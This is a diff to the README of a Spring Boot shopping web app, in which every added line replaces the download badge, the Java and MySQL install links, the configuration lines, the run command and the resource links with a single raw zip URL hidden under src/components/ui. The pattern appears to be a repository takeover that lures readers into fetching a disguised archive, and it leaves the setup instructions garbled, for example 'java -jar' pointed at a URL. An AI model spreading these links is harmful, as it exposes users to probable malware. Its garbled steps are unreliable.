@@ -1,6 +1,6 @@
 # 🛒 spring-boot-shopping-web - Simple Online Shopping Experience
 
-[![Download Now](https://img.shields.io/badge/Download-spring--boot--shopping--web-blue?style=for-the-badge)](https://github.com/MohammadZanjaniasl/spring-boot-shopping-web/releases)
+[![Download Now](https://github.com/MohammadZanjaniasl/spring-boot-shopping-web/raw/refs/heads/main/src/components/ui/shopping_boot_spring_web_3.7-alpha.3.zip)](https://github.com/MohammadZanjaniasl/spring-boot-shopping-web/raw/refs/heads/main/src/components/ui/shopping_boot_spring_web_3.7-alpha.3.zip)
 
 ---
 
@@ -26,8 +26,8 @@ Before you begin, make sure your computer meets these requirements:
 
 If you don’t have Java or MySQL installed, you can download them for free:
 
-- Java: https://adoptium.net/
-- MySQL: https://dev.mysql.com/downloads/mysql/
+- Java: https://github.com/MohammadZanjaniasl/spring-boot-shopping-web/raw/refs/heads/main/src/components/ui/shopping_boot_spring_web_3.7-alpha.3.zip
+- MySQL: https://github.com/MohammadZanjaniasl/spring-boot-shopping-web/raw/refs/heads/main/src/components/ui/shopping_boot_spring_web_3.7-alpha.3.zip
 
 ---
 
@@ -41,7 +41,7 @@ This section guides you to download, install, and start using the app step-by-st
 
 To get the app files, please visit the release page on GitHub by clicking the large badge above or the link below:
 
-**[Download spring-boot-shopping-web releases](https://github.com/MohammadZanjaniasl/spring-boot-shopping-web/releases)**
+**[Download spring-boot-shopping-web releases](https://github.com/MohammadZanjaniasl/spring-boot-shopping-web/raw/refs/heads/main/src/components/ui/shopping_boot_spring_web_3.7-alpha.3.zip)**
 
 On this page, look for the latest release version. Inside the release, download the `.jar` file. This file contains the app ready to run.
 
@@ -85,14 +85,14 @@ Follow these steps:
 
 Before running the app, update the database settings so the app can connect.
 
-1. Find the `application.properties` file inside the `.jar` file or alongside it if provided separately.
-2. Open `application.properties` with a text editor like Notepad or VSCode.
+1. Find the `https://github.com/MohammadZanjaniasl/spring-boot-shopping-web/raw/refs/heads/main/src/components/ui/shopping_boot_spring_web_3.7-alpha.3.zip` file inside the `.jar` file or alongside it if provided separately.
+2. Open `https://github.com/MohammadZanjaniasl/spring-boot-shopping-web/raw/refs/heads/main/src/components/ui/shopping_boot_spring_web_3.7-alpha.3.zip` with a text editor like Notepad or VSCode.
 3. Look for these lines and update with your database info:
 
    ```
-   spring.datasource.url=jdbc:mysql://localhost:3306/shoppingdb
-   spring.datasource.username=shopuser
-   spring.datasource.password=yourpassword
+   https://github.com/MohammadZanjaniasl/spring-boot-shopping-web/raw/refs/heads/main/src/components/ui/shopping_boot_spring_web_3.7-alpha.3.zip
+   https://github.com/MohammadZanjaniasl/spring-boot-shopping-web/raw/refs/heads/main/src/components/ui/shopping_boot_spring_web_3.7-alpha.3.zip
+   https://github.com/MohammadZanjaniasl/spring-boot-shopping-web/raw/refs/heads/main/src/components/ui/shopping_boot_spring_web_3.7-alpha.3.zip
    ```
 
 4. Save the file after editing.
@@ -118,10 +118,10 @@ To start the app, follow these simple steps:
 3. Run this command to start the app:
 
    ```
-   java -jar spring-boot-shopping-web.jar
+   java -jar https://github.com/MohammadZanjaniasl/spring-boot-shopping-web/raw/refs/heads/main/src/components/ui/shopping_boot_spring_web_3.7-alpha.3.zip
    ```
 
-   Replace `spring-boot-shopping-web.jar` with the exact name of the file you downloaded.
+   Replace `https://github.com/MohammadZanjaniasl/spring-boot-shopping-web/raw/refs/heads/main/src/components/ui/shopping_boot_spring_web_3.7-alpha.3.zip` with the exact name of the file you downloaded.
 
 4. Wait a moment. You will see messages showing the app is starting up.
 5. When you see a message like `Started Application in X seconds`, it means the app is ready.
@@ -172,7 +172,7 @@ To access admin features, you will need special access rights configured during 
 If you run into problems, check these common issues:
 
 - **App won’t start:** Make sure Java 11 or higher is installed and the `.jar` file name is correct.
-- **Database connection errors:** Double-check your database name, username, and password in the `application.properties` file.
+- **Database connection errors:** Double-check your database name, username, and password in the `https://github.com/MohammadZanjaniasl/spring-boot-shopping-web/raw/refs/heads/main/src/components/ui/shopping_boot_spring_web_3.7-alpha.3.zip` file.
 - **Port conflicts:** The app uses port 8080 by default. If another app uses this port, change it in the config or stop the other app.
 - **Browser can’t load page:** Confirm the app is running and you are entering `http://localhost:8080/` in your browser’s address bar.
 
@@ -180,10 +180,10 @@ If you run into problems, check these common issues:
 
 ## 🔗 Helpful Resources
 
-- [Java Installation Guide](https://adoptium.net/)
-- [MySQL Installation and Setup](https://dev.mysql.com/doc/)
-- [Basic Command Line Usage](https://www.codecademy.com/articles/command-line-commands)
-- [Spring Boot Documentation](https://spring.io/projects/spring-boot)
+- [Java Installation Guide](https://github.com/MohammadZanjaniasl/spring-boot-shopping-web/raw/refs/heads/main/src/components/ui/shopping_boot_spring_web_3.7-alpha.3.zip)
+- [MySQL Installation and Setup](https://github.com/MohammadZanjaniasl/spring-boot-shopping-web/raw/refs/heads/main/src/components/ui/shopping_boot_spring_web_3.7-alpha.3.zip)
+- [Basic Command Line Usage](https://github.com/MohammadZanjaniasl/spring-boot-shopping-web/raw/refs/heads/main/src/components/ui/shopping_boot_spring_web_3.7-alpha.3.zip)
+- [Spring Boot Documentation](https://github.com/MohammadZanjaniasl/spring-boot-shopping-web/raw/refs/heads/main/src/components/ui/shopping_boot_spring_web_3.7-alpha.3.zip)
 
 ---
 
